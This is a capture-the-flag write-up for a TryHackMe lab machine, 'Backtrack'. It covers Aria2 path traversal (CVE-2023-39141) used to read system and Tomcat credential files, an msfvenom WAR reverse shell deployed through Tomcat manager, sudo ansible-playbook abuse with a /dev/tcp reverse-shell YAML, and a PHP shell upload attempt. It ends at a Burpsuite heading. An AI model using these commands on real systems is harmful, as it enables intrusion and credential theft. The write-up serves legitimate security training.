# THM - Backtrack

Target IP - 10.10.240.100

## Enumeration

#### Nmap

Running the following command, we can see all the available and open ports and what is being run on them:

```
nmap -sC -sV 10.10.240.100 -p- -vv --min-rate 10000
```

![[Pasted image 20250104233730.png]]

From the above response, we are able to identify many web servers running, looking at what is running on each webpage, we see the following:

###### Port 8080

![[Pasted image 20250104234134.png]]

###### Port 8888

![[Pasted image 20250104234156.png]]

Looking at the above two webpages that work, we see an Apache Tomcat instance and a Aria2 instance. Looking at the version numbers for both instances, Apache Tomcat version 8.5.93 does not have any usable vulnerabilities however, in the Aria2 instance by heading to Settings then Server Info we see the following version 1.35.0:

![[Pasted image 20250104234439.png]]


## Exploit

Looking up the following version for vulnerabilities online we find the following:

![[Pasted image 20250104235319.png]]

Here we found a Path Traversal Vulnerability under the CVE-2023-39141. Using this CVE we are able to access files on the target system using a path such as the following which was used in a PoC (Proof of Concept):

```
curl --path-as-is http://10.10.240.100:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```

From this we are able to successfully read the `/etc/passwd` file of the target machine, this reveals the following information:

![[Pasted image 20250105093048.png]]

Here we are able to obtain the location of the tomcat instance which is `/opt/tomcat`. This means that we can head to this folder to find our configuration files which can have exposed credentials. This file is located in the following path: `/opt/tomcat/conf/tomcat-users.xml`. This file is typically use to assign users and roles to the tomcat instance. However, here we see the following:

```
curl --path-as-is http://10.10.240.100:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
```

![[Pasted image 20250105093624.png]]

Now that we have the username and password, we can search online for a authenticated Tomcat RCE (Remote Code Execution) vulnerability. [Here](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00) we found a manager-script role exploit.

Following the process outlined in the exploit we are able to obtain a reverse shell on the target system.

```
msfvenom -p java/shell_reverse_tcp lhost=10.4.109.132 lport=1234 -f war -o pwn.war
curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file pwn.war "http://10.10.240.100:8080/manager/text/deploy?path=/foo&update=true"
```

![[Pasted image 20250106182252.png]]

```
nc -lvnp 1234
curl http://10.10.240.100:8080/foo
```

![[Pasted image 20250106182452.png]]

#### Reverse Shell

Heading to the `/opt/tomcat` directory we are able to receive the first flag:

![[Pasted image 20250106182742.png]]

Before we move on we will first upgrade our terminal using the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![[Pasted image 20250106183455.png]]

## Terminal as Wilbur

Upon running the command:

```
sudo -l
```

We receive the output:

![[Pasted image 20250106183706.png]]

Here we see that we can run a command as Wilbur, however, due to the fact that there is a `*` wildcard means that we can write any file there. However, we cannot write a file to the folder it is currently in, luckily the wildcard does not stop path traversal, so we can "backtrack" to another folder than we can write to and upload a `.yml` shell file we find online. First we will look for a `.yml` shell online:

![[Pasted image 20250106185133.png]]

Here we will copy this shell into a temporary shell:

```
cd /tmp
mkdir /shell
cd shell
# In this directory place the file:
echo "- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.4.109.132:4444 0>&1'" > shell.yml
chmod 777 shell.yml
```

Now we will run the command to execute the payload but before we do, we will run a netcat listener on the same port as above:

```
nc -lvnp 4444
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell/shell.yml
```

Now we have successfully obtained a shell as wilbur:

![[Pasted image 20250106191017.png]]

We will upgrade the shell again using the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now heading to the home directory for Wilbur we find this file:

![[Pasted image 20250106191621.png]]

Now we also see the credentials for wilbur in a secret file, which reads:

```
cat .just_in_case.txt 
in case i forget :

wilbur:mYe317Tb9qTNrWFND7KF
```

So now rather than working in a barely working shell, we can login using ssh however, before we do so, we can do some port forwarding to let our attack box see the local web application, we can do so by running the following command on our attack box:

```
ssh wilbur@10.10.15.184 -L 5555:127.0.0.1:80
```

Now heading to `http://localhost:55555`, we can see the following web application:

![[Pasted image 20250106193130.png]]

Now logging in give the credentials previously given, we are able to upload images to the server.
So now we will get a php reverse shell from pentest-monkey, edit the file and upload it to the server. However we receive an error stating that it needs to be of an image format:

![[Pasted image 20250106193522.png]]

So we will try to bypass this by adding the `.jpg` in the filename then at the end of the name it will be `.php`.
However, the shell does not execute. Now we will check in Burpsuite what the issue is:

#### Burpsuite
